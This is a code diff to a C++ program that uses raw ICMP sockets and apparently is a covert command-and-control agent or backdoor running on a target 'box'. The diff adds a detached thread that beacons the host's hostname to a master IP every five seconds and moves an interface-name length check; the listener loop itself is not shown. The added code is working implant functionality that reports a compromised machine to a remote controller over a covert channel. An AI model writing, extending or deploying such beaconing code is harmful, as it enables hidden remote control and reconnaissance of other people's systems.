@@ -4,6 +4,7 @@
 #include <string>
 #include <vector>
 #include <sstream>
+#include <thread>
 
 #include <unistd.h>
 #include <sys/types.h>
@@ -120,6 +121,28 @@ long receive_ping(int sockfd, std::string &src, uint8_t *buf, size_t size)
   return ret - sizeof(iphdr) - sizeof(icmphdr);
 }
 
+void beacon_task(const std::string &dst, const std::string &opt)
+{
+  // Create the raw socket.
+  int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
+  if (sockfd == -1) {
+    perror("socket");
+    exit(-1);
+  }
+
+  char hostname[256];
+  gethostname(hostname, sizeof(hostname));
+
+  setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, opt.c_str(), opt.size());
+
+  while (1) {
+    std::string beacon = "(beacon) ";
+    beacon.append(hostname);
+    send_ping(sockfd, dst, (uint8_t *)beacon.c_str(), beacon.size() + 1);
+    usleep(5000000);
+  }
+}
+
 std::vector<std::string> split_input(std::string &input)
 {
   std::vector<std::string> ret;
@@ -228,11 +251,15 @@ int main(int argc, char **argv)
     usage(0);
   }
 
-  gethostname(hostname, sizeof(hostname));
-
   // Master IP address that box will continuously ping.
   char *opt = argv[1];
   char *dest_ip = argv[2];
+
+  const size_t len = strnlen(opt, IFNAMSIZ);
+  if (len == IFNAMSIZ) {
+    std::fputs("Too long iface name", stderr);
+    exit(-1);
+  }
 
   // Create the raw socket.
   int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
@@ -241,13 +268,11 @@ int main(int argc, char **argv)
     return -1;
   }
 
-  const size_t len = strnlen(opt, IFNAMSIZ);
-  if (len == IFNAMSIZ) {
-    std::fputs("Too long iface name", stderr);
-    exit(-1);
-  }
-
   setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, opt, len);
+
+  std::puts("Starting beacon thread.");
+  std::thread beacon_thread(beacon_task, dest_ip, opt);
+  beacon_thread.detach();
 
   // Start the listener loop.
   while (1) {
